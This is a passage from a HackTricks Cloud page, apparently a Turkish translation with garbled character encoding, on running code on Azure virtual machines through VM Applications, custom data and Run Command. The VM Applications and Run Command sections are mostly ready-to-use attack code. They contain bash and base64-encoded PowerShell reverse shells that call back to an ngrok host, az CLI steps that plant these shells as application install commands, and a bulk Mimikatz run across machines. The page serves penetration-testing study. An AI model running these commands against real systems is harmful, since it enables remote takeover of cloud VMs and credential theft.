<summary>Hibrit Runbook Ã‡alÄ±ÅŸanÄ±</summary>

Bu, otomasyon hesabÄ±ndan VM'lerde runbook'larÄ± Ã§alÄ±ÅŸtÄ±rmaya olanak tanÄ±yan bir VM uzantÄ±sÄ±dÄ±r. Daha fazla bilgi iÃ§in [Otomasyon HesaplarÄ± hizmetine](../az-automation-account/) bakÄ±n.

</details>

### VM UygulamalarÄ±

Bunlar, VM'lerde uygulamayÄ± kolayca eklemek ve kaldÄ±rmak iÃ§in kullanÄ±labilecek tÃ¼m **uygulama verileri ve yÃ¼kleme ile kaldÄ±rma betikleri** iÃ§eren paketlerdir.

{% code overflow="wrap" %}
```bash
# List all galleries in resource group
az sig list --resource-group <res-group> --output table

# List all apps in a fallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table
```
{% endcode %}

UygulamalarÄ±n dosya sistemine indirildiÄŸi yollar ÅŸunlardÄ±r:

* Linux: `/var/lib/waagent/Microsoft.CPlat.Core.VMApplicationManagerLinux/<appname>/<app version>`
* Windows: `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.9\Downloads\<appname>\<app version>`

Yeni uygulamalarÄ±n nasÄ±l yÃ¼kleneceÄŸini kontrol edin [https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli](https://learn.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=cli)

{% hint style="danger" %}
Bireysel uygulamalarÄ± ve galerileri **diÄŸer abonelikler veya kiracÄ±lar ile paylaÅŸmak mÃ¼mkÃ¼ndÃ¼r**. Bu, bir saldÄ±rganÄ±n bir uygulamaya arka kapÄ± koymasÄ±na ve diÄŸer aboneliklere ve kiracÄ±lara geÃ§iÅŸ yapmasÄ±na olanak tanÄ±yabileceÄŸi iÃ§in oldukÃ§a ilginÃ§tir.
{% endhint %}

Ancak **vm uygulamalarÄ± iÃ§in bir "pazar yeri" yoktur** uzantÄ±lar iÃ§in olduÄŸu gibi.

Gerekli izinler ÅŸunlardÄ±r:

* `Microsoft.Compute/galleries/applications/write`
* `Microsoft.Compute/galleries/applications/versions/write`
* `Microsoft.Compute/virtualMachines/write`
* `Microsoft.Network/networkInterfaces/join/action`
* `Microsoft.Compute/disks/write`

Keyfi komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in istismar Ã¶rneÄŸi:

{% tabs %}
{% tab title="Linux" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group myResourceGroup \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellApp \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Linux \
--location "West US 2"

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
az sig gallery-application version create \
--version-name 1.0.2 \
--application-name myReverseShellApp \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--remove-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" \
--update-command "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name <vm-name> \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellApp/versions/1.0.2 \
--treat-deployment-as-failure true
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# Create gallery (if the isn't any)
az sig create --resource-group <rsc-group> \
--gallery-name myGallery --location "West US 2"

# Create application container
az sig gallery-application create \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--resource-group <rsc-group> \
--os-type Windows \
--location "West US 2"

# Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

# Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
az sig gallery-application version create \
--version-name 1.0.0 \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "powershell.exe -EncodedCommand $encodedCommand" \
--remove-command "powershell.exe -EncodedCommand $encodedCommand" \
--update-command "powershell.exe -EncodedCommand $encodedCommand"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name deleteme-win4 \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellAppWin/versions/1.0.0 \
--treat-deployment-as-failure true
```
{% endcode %}
{% endtab %}
{% endtabs %}

### KullanÄ±cÄ± verisi

Bu, herhangi bir zamanda meta veri uÃ§ noktasÄ±ndan alÄ±nabilen **kalÄ±cÄ± veridir**. Azure'da kullanÄ±cÄ± verisinin AWS ve GCP'den farklÄ± olduÄŸunu unutmayÄ±n Ã§Ã¼nkÃ¼ **buraya bir betik koyarsanÄ±z, varsayÄ±lan olarak Ã§alÄ±ÅŸtÄ±rÄ±lmaz**.

### Ã–zel veri

VM'ye bazÄ± verilerin iletilmesi mÃ¼mkÃ¼ndÃ¼r ve bu veriler beklenen yollar iÃ§inde saklanÄ±r:

* **Windows**'ta Ã¶zel veri `%SYSTEMDRIVE%\AzureData\CustomData.bin` iÃ§inde ikili dosya olarak yer alÄ±r ve iÅŸlenmez.
* **Linux**'ta `/var/lib/waagent/ovf-env.xml` iÃ§inde saklanÄ±yordu ve ÅŸimdi `/var/lib/waagent/CustomData/ovf-env.xml` iÃ§inde saklanÄ±yor.
* **Linux ajanÄ±**: VarsayÄ±lan olarak Ã¶zel veriyi iÅŸlemez, verinin etkin olduÄŸu Ã¶zel bir imaj gereklidir.
* **cloud-init:** VarsayÄ±lan olarak Ã¶zel veriyi iÅŸler ve bu veri [**birÃ§ok formatta**](https://cloudinit.readthedocs.io/en/latest/explanation/format.html) olabilir. Sadece Ã¶zel veride betiÄŸi gÃ¶ndererek kolayca bir betik Ã§alÄ±ÅŸtÄ±rabilir.
* Hem Ubuntu hem de Debian'Ä±n buraya koyduÄŸunuz betiÄŸi Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nÄ± denedim.
* Bunun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in kullanÄ±cÄ± verisini etkinleÅŸtirmek de gerekmez.
```bash
#!/bin/sh
echo "Hello World" > /var/tmp/output.txt
```
### **Komut Ã‡alÄ±ÅŸtÄ±r**

Bu, Azure'un **VM'lerde rastgele komutlar Ã§alÄ±ÅŸtÄ±rmak iÃ§in** saÄŸladÄ±ÄŸÄ± en temel mekanizmadÄ±r. Gerekli izin `Microsoft.Compute/virtualMachines/runCommand/action`'dÄ±r.

{% tabs %}
{% tab title="Linux" %}
```bash
# Execute rev shell
az vm run-command invoke \
--resource-group <rsc-group> \
--name <vm-name> \
--command-id RunShellScript \
--scripts @revshell.sh

# revshell.sh file content
echo "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" > revshell.sh
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
# Execute a rev shell
az vm run-command invoke \
--resource-group Research \
--name juastavm \
--command-id RunPowerShellScript \
--scripts @revshell.ps1

## Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

## Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

# The content of
echo "powershell.exe -EncodedCommand $encodedCommand" > revshell.ps1


# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Yetki YÃ¼kseltme

{% content-ref url="../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md" %}
[az-virtual-machines-and-network-privesc.md](../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md)
{% endcontent-ref %}

## Kimlik DoÄŸrulamasÄ± Olmadan EriÅŸim

{% content-ref url="../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md" %}
[az-vms-unath.md](../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md)
{% endcontent-ref %}

## SÃ¶mÃ¼rÃ¼ SonrasÄ±

{% content-ref url="../../az-post-exploitation/az-vms-and-network-post-exploitation.md" %}
[az-vms-and-network-post-exploitation.md](../../az-post-exploitation/az-vms-and-network-post-exploitation.md)
{% endcontent-ref %}

## SÃ¼reklilik

{% content-ref url="../../az-persistence/az-vms-persistence.md" %}
[az-vms-persistence.md](../../az-persistence/az-vms-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)
* [https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
